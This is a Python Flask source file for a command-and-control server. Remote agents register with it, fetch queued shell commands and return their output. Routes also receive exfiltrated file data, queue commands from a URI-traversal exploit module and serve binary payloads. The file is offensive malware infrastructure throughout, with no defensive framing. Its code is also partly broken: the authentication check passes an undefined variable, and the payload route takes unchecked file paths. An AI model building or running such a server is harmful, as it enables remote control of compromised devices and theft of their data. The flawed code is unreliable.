from flask import Flask, request, jsonify, abort, send_file, render_template
from flask_cors import CORS
import os
import hmac, hashlib
from token_utils import verify_signature

app = Flask(__name__)
CORS(app)

# In-memory command queue for demo (replace with DB in production)
device_commands = {}
device_outputs = {}

@app.before_request
def check_auth():
    if request.path.startswith(("/get_command", "/set_command", "/post_output")):
        agent_id = request.headers.get("X-Agent-ID")
        sig = request.headers.get("X-Signature")
        if not agent_id or not sig or not verify_signature(agent_id_sig):
            abort(403)

@app.route("/")
def dashboard():
    return render_template("index.html")

@app.route("/register", methods=["POST"])
def register():
    device_id = request.json.get("device_id")
    if device_id not in device_commands:
        device_commands[device_id] = "id"
        print(f"[+] New agent registered: {device_id}")
    return jsonify({"status": "registered"})

@app.route("/get_command/<device_id>", methods=["GET"])
def get_command(device_id):
    cmd = device_commands.get(device_id, "")
    print(f"[>] Sending command to {device_id}: {cmd}")
    return jsonify({"cmd": cmd})

@app.route("/post_output", methods=["POST"])
def post_output():
    data = request.json
    device_id = data.get("device_id")
    output = data.get("output")
    print(f"[<] Output from {device_id}:\n{output}")
    device_outputs[device_id] = output
    return jsonify({"status": "ok"})

@app.route("/set_command", methods=["POST"])
def set_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    device_commands[device_id] = command
    print(f"[!] Command for {device_id} set to: {command}")
    return jsonify({"status": "command set"})

@app.route("/exfil", methods=["POST"])
def receive_file():
    content = request.data.decode()
    print(f"\n[EXFIL] Received file data:\n{content}\n")
    return jsonify({"status": "received"})

@app.route("/exploit/uri_traversal", methods=["POST"])
def uri_traversal():
    data = request.json
    package = data.get("package")
    component = data.get("component")
    
    from modules import exploit_uri_traversal
    command = exploit_uri_traversal.generate_command(package, component)
    
    device_id = data.get("device_id")
    device_commands[device_id] = command
    return jsonify({"status": "queued", "command": command})

@app.route("/payloads/<filename>", methods=["GET"])
def get_payload(filename):
    payload_path = os.path.join("payloads", filename)
    if not os.path.exists(payload_path):
        return {"error": "File not found"}, 404
    return send_file(payload_path, mimetype="application/octet-stream")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
